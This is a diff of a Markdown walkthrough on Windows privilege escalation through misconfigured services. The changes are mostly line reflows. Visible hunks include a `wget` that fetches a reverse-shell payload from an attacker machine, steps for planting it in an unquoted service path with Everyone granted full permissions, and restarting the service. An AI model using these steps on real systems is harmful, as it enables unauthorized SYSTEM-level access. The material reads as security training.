@@ -1,19 +1,19 @@
 # Abusing service misconfigurations 
 
-Escalate through insecure permissions on service executable
+Escalate through insecure permissions on service executable:
 
 1. Misconfigured Service executable DACL (modifiable permissions on the executable)
 2. Reverse shell payload replacing service executable
 3. Listener on attack machine
 
-Escalate through unquoted service path
+Escalate through unquoted service path:
 
 1. Service binaries in a non-default path
 2. BUILTIN\\Users group has AD and WD privileges
 3. Reverse shell exe-service payload
 4. Listener on attack machine
 
-Escalate through insecure service permissions
+Escalate through insecure service permissions:
 
 1. Misconfigured Service DACL
 2. Reverse shell exe-service payload
@@ -53,8 +53,7 @@ C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                   APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
 ```
 
-The `Everyone` group has modify permissions (M) on the service's executable. We can overwrite it with any payload, 
-and the service will execute it with the privileges of the configured user account.
+The `Everyone` group has modify permissions (M) on the service's executable. We can overwrite it with any payload, and the service will execute it with the privileges of the configured user account.
 
 2. Generate an exe-service payload using msfvenom and serve it through a python webserver:
 
@@ -129,8 +128,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 wget http://<IP address attack machine>:8000/rev-svc2.exe -O rev-svc2.exe
 ```
 
-4. Move it to any of the locations where hijacking might occur. For example, move it to `C:\MyPrograms\Disk.exe`, 
-and grant `Everyone` full permissions on the file to make sure it can be executed by the service:
+4. Move it to any of the locations where hijacking might occur. For example, move it to `C:\MyPrograms\Disk.exe`, and grant `Everyone` full permissions on the file to make sure it can be executed by the service:
 
 ```text
 C:\> move C:\Users\unprivilegedusername\rev-svc2.exe C:\MyPrograms\Disk.exe
@@ -154,8 +152,7 @@ C:\> sc start "disk sorter enterprise"
 
 ### Misconfigured Service DACL
 
-1. Download [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite 
-to `C:\\tools`.
+1. Download [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to `C:\\tools`.
 2. Check a namedservice DACL:
 
 ```text
@@ -216,34 +213,25 @@ C:\> sc start NamedService
 
 ## Notes
 
-Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the 
-state of services as needed, checking the current status of any given service and generally providing a way to configure services.
+Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.
 
-* Use the `sc qc someservice` command for more info on a service. The associated executable is specified through the 
-`BINARY_PATH_NAME` parameter, and the account used to run the service is shown on the `SERVICE_START_NAME` parameter.
-* Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, 
-query status, query configuration, or reconfigure the service, amongst other privileges. 
+* Use the `sc qc someservice` command for more info on a service. The associated executable is specified through the`BINARY_PATH_NAME` parameter, and the account used to run the service is shown on the `SERVICE_START_NAME` parameter.
+* Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. 
 * All services configurations are stored in the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`
-* A subkey exists for every service in the system. If a DACL has been configured for the service, it will be stored 
-in a subkey called `Security`. Only administrators can modify such registry entries by default.
+* A subkey exists for every service in the system. If a DACL has been configured for the service, it will be stored in a subkey called `Security`. Only administrators can modify such registry entries by default.
 
 ### Insecure Permissions on Service Executable
 
-If an executable associated with a service has weak permissions that allow an adversary to modify or replace it, 
-the adversary can gain the privileges of the service's account. 
+If an executable associated with a service has weak permissions that allow an adversary to modify or replace it, the adversary can gain the privileges of the service's account. 
 
 ### Unquoted path vulnerability
 
-When we can't directly write into service executables, there might still be a chance. Most of the service executables 
-will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which isn't writable by unprivileged 
-users. This prevents any vulnerable service from being exploited. There are exceptions to this rule. 
+When we can't directly write into service executables, there might still be a chance. Most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule. 
 Some installers change the permissions on the installed folders, making the services vulnerable. 
-An administrator might decide to install the service binaries in a non-default path. If such a path is 
-world-writable, an "Unquoted Service Paths vulnerability" (if found) can be exploited.
+An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, an "Unquoted Service Paths vulnerability" (if found) can be exploited.
 
 For example, the Administrator installed the `Disk Sorter` binaries under `c:\MyPrograms`. 
-By default, this inherits the permissions of the `C:\` directory, which allows any user to create files and folders 
-in it. Check with `icacls` in the Command Prompt:
+By default, this inherits the permissions of the `C:\` directory, which allows any user to create files and folders in it. Check with `icacls` in the Command Prompt:
 
 ```text
 C:\>icacls c:\MyPrograms
@@ -256,8 +244,7 @@ c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
 ```
 The `BUILTIN\\Users` group has `AD` and `WD` privileges, allowing a user to create subdirectories and files.
 
-The `Unquoted` in "Unquoted Service Paths vulnerability" means that the path of the associated executable is not 
-properly quoted to account for spaces on the command.
+The `Unquoted` in "Unquoted Service Paths vulnerability" means that the path of the associated executable is not properly quoted to account for spaces on the command.
 
 Quoted:
 
@@ -278,7 +265,4 @@ Unless `Disk.exe` or `Disk Sorter.exe` exists!
 
 ### Insecure service permissions
 
-You might still have a slight chance of taking advantage of a service if the service's executable DACL is well 
-configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable 
-DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will 
-allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.
+You might still have a slight chance of taking advantage of a service if the service's executable `DACL` is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable `DACL`) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including `SYSTEM` itself.
